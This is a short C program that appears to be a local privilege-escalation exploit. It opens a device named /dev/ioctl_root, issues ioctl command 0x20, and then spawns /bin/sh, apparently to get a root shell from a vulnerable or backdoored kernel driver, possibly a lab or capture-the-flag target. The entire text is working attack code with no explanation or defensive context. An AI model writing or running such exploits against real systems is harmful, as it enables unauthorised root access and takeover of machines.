#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define MY_IOCTL_CMD 0x20

int main() {

    int fd = open("/dev/ioctl_root", O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }
    ioctl(fd, MY_IOCTL_CMD);
    close(fd);
    execl("/bin/sh", "sh", NULL);
    return 0;
}
